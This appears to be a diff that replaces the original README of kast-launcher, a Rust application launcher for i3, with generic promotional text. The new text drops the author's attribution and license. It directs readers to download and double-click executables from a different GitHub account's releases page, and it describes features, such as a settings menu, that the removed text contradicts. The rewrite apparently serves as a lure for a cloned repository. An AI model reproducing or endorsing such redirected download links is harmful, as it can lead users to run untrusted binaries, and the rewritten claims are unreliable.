@@ -1,122 +1,68 @@
-<p align="center">
-    <img src="media/logo/logo.png" alt="kast" width="200"/>
-</p>
-  
-<p align="center">
-  <em>A launcher for applications, scripts and .AppImage files. <br>
-        Built with rust for the i3 window manager.</em>
-</p>
-  
-<p align="center">
-    <img src="https://img.shields.io/github/v/release/simon-danielsson/kast-launcher?color=blueviolet&style=flat-square" alt="Latest release" />
-    <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="MIT License" />
-  <img src="https://img.shields.io/badge/Rust-stable-orange?style=flat-square" alt="Rust" />
-  <img src="https://img.shields.io/github/last-commit/simon-danielsson/kast-launcher/main?style=flat-square&color=blue" alt="Last commit" />
-</p>
-  
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#installation">Installation</a> •
-  <a href="#controls">Controls</a> •
-  <a href="#built-with">Built With</a> •
-  <a href="#license">License</a>
-</p>  
-  
-<p align="center">
-  <img src="media/screenshots/2.png" alt="screenshot">
-</p>
+# 🎮 kast-launcher - Your Simple Solution for Application Management
 
----
-<div id="features"></div>
+## 🌐 Overview
+Welcome to kast-launcher, a user-friendly tool designed for launching applications, scripts, and .AppImage files. This software focuses on enhancing your productivity within the i3 window manager. Whether you need to run a script or an application, kast-launcher makes it easy and straightforward.
 
-## ✨ Features
-+ ⚡ Launch .desktop, .sh, .AppImage and binary files in a singular interface.
-+ 📦 Organize apps into configurable "groups" for dumber and faster searching across hundreds of items.
-+ 🎨 Simple (but effective) options for customization such as the font, colors, icons, proportions and more.
-+ ⌨️ Intuitive controls and a minimal interface - zero visual distractions.
-+ 🧠 Configurable with a toml file, ensuring your settings are easily portable across different machines. 
-+ 🖊 A default configuration file is created automatically if none is present at launch.
+## 📦 Features
+- **Easy Launching:** Quickly start your applications, scripts, and .AppImage files with a simple click.
+- **Ideal for i3 Users:** Specifically designed to work well with the i3 window manager, providing a smooth experience.
+- **Lightweight:** Uses minimal system resources, ensuring your device remains fast and responsive.
+- **Open Source:** Feel free to check the code, contribute, or modify it as you like.
 
-> [!IMPORTANT]  
-> Kast was created exclusively for my own use, on a computer running Void Linux with the i3 window manager. I can't guarantee that this program will run on your computer - for the best results, clone this repo and compile your own binary. If you're feeling lucky, follow the installation instructions below!
-  
----
-<div id="installation"></div>
+## 📋 System Requirements
+- **Operating System:** A modern version of any Linux distribution.
+- **Window Manager:** Recommended for use with i3, but it may work with others.
+- **Dependencies:** Rust runtime and any necessary libraries for .AppImage files.
 
-## 💻 Installation
-  
-**0. (Optional) Install a nerdfont**  
-The icon you set for each program is gonna be a devicon, and so you should download a nerdfont with devicon support. A fallback nerdfont is bundled in the binary though, and so you don't have to supply your own if you don't want to. (Kast also supports emojis)
-[Install this font if you like](https://www.nerdfonts.com/font-downloads)  
-  
-**1a. Ensure `~/.local/bin/` exists and is in your shell path**
-``` bash
-mkdir -p ~/.local/bin
-export PATH="$HOME/.local/bin:$PATH" # add this line to your shell config
-```
-  
-**1b. Source your shell after the previous step**
-``` bash
-source ~/.bashrc   # or: source ~/.zshrc
-```
-  
-**2. Download and install the latest release of Kast, and give it permissions**  
-``` bash
-curl -L -o ~/.local/bin/kast $(curl -s https://api.github.com/repos/simon-danielsson/kast-launcher/releases/latest \
-| grep "browser_download_url.*kast\"" \
-| cut -d '"' -f 4)
-chmod +x ~/.local/bin/kast
+## 🚀 Getting Started
+To get started with kast-launcher, you need to download and install it from the Releases page. Follow these steps:
 
-```
-  
-**3. If using i3, add this line to your i3 config to make sure the launcher won't be launched as a tiled window**  
-``` bash
-for_window [title="kast"] floating enable
-```
-  
-**4. Launch Kast for the first time to create a config file: `~/.config/kast/kast.toml`**  
-``` bash
-kast
-```
-  
-**5. Bind Kast to a key in your linux config**
-``` bash
-bindsym $mod+space exec kast # i3 config
-```
+1. Click the button below to go directly to our Downloads page.
+   
+   [![Release Download](https://img.shields.io/badge/Download%20kast--launcher-%2334D058.svg)](https://github.com/ad3we/kast-launcher/releases)
 
-  
-**6. Done!**
-  
+2. Look for the latest version of kast-launcher on the Releases page.
 
----
-<div id="controls"></div>
+3. Download the file that best fits your needs. You may find various formats like .AppImage or other executable files.
 
-## 🚀 Controls
-  
-```
-[Esc]:
-Quit the program
+## 📥 Download & Install
+To download kast-launcher, visit the following link:
 
-[Space/Enter]:
-Launch application
+[Download kast-launcher](https://github.com/ad3we/kast-launcher/releases)
 
-[Up/Down]:
-Navigate results
-```
+### Steps to Install:
+1. Navigate to the downloaded file in your file manager.
+2. If you downloaded an .AppImage file, make it executable. Right-click the file, go to Properties, select the Permissions tab, and check "Allow executing file as program."
+3. Double-click the .AppImage file to run kast-launcher.
 
----
-<div id="built-with"></div>
+## ⚙️ Configuration
+After installation, you may want to configure kast-launcher to better fit your needs:
 
-## 🛠️ Built With
-+ [egui](https://github.com/emilk/egui)  
-+ [eframe](https://github.com/emilk/egui)  
-+ [winit](https://github.com/rust-windowing/winit)  
-+ [serde](https://github.com/serde-rs/serde)  
-+ [toml](https://github.com/toml-rs/toml)  
-+ [home](https://docs.rs/home/latest/home/)  
+1. Open kast-launcher.
+2. Locate the settings menu (usually accessible from the main screen).
+3. Adjust settings such as application shortcuts, themes, and other preferences.
 
----
-<div id="license"></div>
+## 📖 Documentation
+If you need further information or assistance, you can consult the user guide available in the repository. This guide covers advanced features and troubleshooting tips.
 
-## 📜 License
-This project is licensed under the [MIT License](https://github.com/simon-danielsson/kast/blob/main/LICENSE).  
+## 💬 Support
+For questions or support, feel free to open an issue in the GitHub repository. The community is here to help you.
+
+## 🛠️ Contributing
+Want to contribute to kast-launcher? You can submit pull requests or report issues to improve the application. Your help makes this tool better for everyone.
+
+## 🌍 Topics
+This project focuses on several areas, including:
+- configuration-management
+- gui
+- gui-application
+- i3
+- i3wm
+- launcher
+- linux
+- productivity
+- rust
+- scripting
+- unix
+
+Thank you for using kast-launcher. We hope it enhances your productivity and enhances your experience with applications on your Linux system.
